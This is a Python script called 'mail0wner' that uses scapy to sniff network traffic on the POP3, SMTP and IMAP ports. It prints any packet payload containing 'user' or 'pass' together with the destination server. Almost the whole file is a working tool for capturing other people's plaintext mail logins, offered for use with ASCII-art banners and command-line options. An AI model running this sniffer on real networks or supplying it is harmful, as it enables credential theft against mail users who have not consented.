#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.info("finished")
logging.captureWarnings(True)
from scapy.all import *
import time
import random
import netifaces
from optparse import OptionParser
#supress annoying scapy warnings
import requests.packages.urllib3
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

parser = OptionParser(usage="usage: sudo %prog [options]")
parser.add_option("-t", "--time", action="store", dest="time", default=100, type=int, help="Total time to sniff packets. Default: 100")
parser.add_option("-i", "--interface", action="store", dest="iface", default="eth0", help="Interface to use. Default: eth0.")
parser.add_option("-l", "--list-interfaces", action="store_true", dest="list", default=False, help="List usable interfaces and exit.")
parser.add_option("-q", "--quiet", action="store_true", dest="quietMode", default=False, help="Dont print the huge banners at runtime")
#parser.add_option("-f", "--file", action="store", dest="infile", default=None, help="Read packets from a file") #in testing
(options, args) = parser.parse_args()

iface = options.iface
timeout = options.time
lstInt = options.list
OK_GREEN = "\033[92m"
OK_BLUE = "\033[94m"
ERR = "\033[91m"
ENDC = "\033[0m"

#handle colors
def printMsg(s):
    print(OK_BLUE + "[*]" + ENDC + " " + s)
def printGood(s):
    print(OK_GREEN + "[*]" + ENDC + " " + s)
def printErr(s):
    print(ERR + "[!]" + ENDC + " " + s)

def banner():
    banner = """\033[91m
███╗   ███╗ █████╗ ██╗██╗      ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗
████╗ ████║██╔══██╗██║██║     ██╔═████╗██║    ██║████╗  ██║██╔════╝██╔══██╗
██╔████╔██║███████║██║██║     ██║██╔██║██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██║╚██╔╝██║██╔══██║██║██║     ████╔╝██║██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██║ ╚═╝ ██║██║  ██║██║███████╗╚██████╔╝╚███╔███╔╝██║ ╚████║███████╗██║  ██║
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ \033[0m
By: rndmaccess <https://github.com/rndmaccess/>
\n
"""
    print(banner)

def banner2():
    banner2x = """
\033[94m           _ _ ___
 _____ ___|_| |   |_ _ _ ___ ___ ___
|     | .'| | | | | | | |   | -_|  _|
|_|_|_|__,|_|_|___|_____|_|_|___|_| \033[0m
By: rndmaccess <https://github.com/rndmaccess/>    """
    print(banner2x)

def banner3():
    banner3x = """
\033[92m                         ___       __
                     __ /\_ \    /'__`\\
  ___ ___      __   /\_\\\\//\ \  /\ \/\ \  __  __  __    ___      __   _ __
/' __` __`\  /'__`\ \/\ \ \ \ \ \ \ \ \ \/\ \/\ \/\ \ /' _ `\  /'__`\/\`'__\\
/\ \/\ \/\ \/\ \L\.\_\ \ \ \_\ \_\ \ \_\ \ \ \_/ \_/ \/\ \/\ \/\  __/\ \ \/
\ \_\ \_\ \_\ \__/.\_\\\\ \_\/\____\\\\ \____/\ \___x___/'\ \_\ \_\ \____\\\\ \_\\
 \/_/\/_/\/_/\/__/\/_/ \/_/\/____/ \/___/  \/__//__/   \/_/\/_/\/____/ \/_/ \033[0m
By: rndmaccess <https://github.com/rndmaccess/>"""
    print(banner3x)

def get_random_banner():
    bannernum = random.randrange(0,3)
    if bannernum == 0:
        banner()
    elif bannernum == 1:
        banner2()
    elif bannernum == 2:
        banner3()
    else:
        banner()
#packet callback for scapy (parsing packet)
def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            printGood("Server: %s" % packet[IP].dst)
            printGood("%s" % packet[TCP].payload)

def sniffer(): # main function that starts sniffer
    try:
	if 'mon' in iface:
	    printErr("Monitor mode cards are not supported. Please use another interface.")
	    exit(1)
        #start sniffer
        printMsg("Starting Sniffer on interface: " + "\033[93m" + iface + "\033[0m")
        time.sleep(1)
        printMsg("Running for %i seconds..." % options.time)
        try:
            sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0, timeout=timeout, iface=iface)
            #port 110 = POP3
            #port 143 = IMAP
            #port 25  = SMTP
        except socket.error as se:
            printErr("Couldn't start sniffer. Try running as root or using another interface")
        printMsg("Sniffer has finished. Thanks for using mail0wner!")
        exit(0)
    except OSError as e: #catch unknown interface OSError
        printErr("Unknown interface: %s. (use the -i switch to specify an interface)" % options.iface)
        exit(1)
def main():
    if not os.geteuid() == 0:
        printErr("Script must be run as root. Exiting...")
        exit(-1)
    else:
        if lstInt == True:
            banner2()
            printMsg("Getting interface information...")
            time.sleep(1)
            ifaces = netifaces.interfaces()
            printGood("Available interfaces are: ")
            print ifaces
            exit(0)
	#elif options.infile != None:
	#	print "\n"
	#	printMsg("Reading packets from \033[93m" + options.infile + "\033[0m"
	#	pcapfile = rdpcap(options.infile)
	#	if file == None; #might cause problems
	#	    printErr("No packets in file!")
	#	else:
	#	    print file
	#	    exit(0)
        else:
    	    if options.quietMode == True:
                	sniffer() # call sniffer function
    	    else:
                get_random_banner()
                sniffer()
if __name__ == '__main__':
    main()
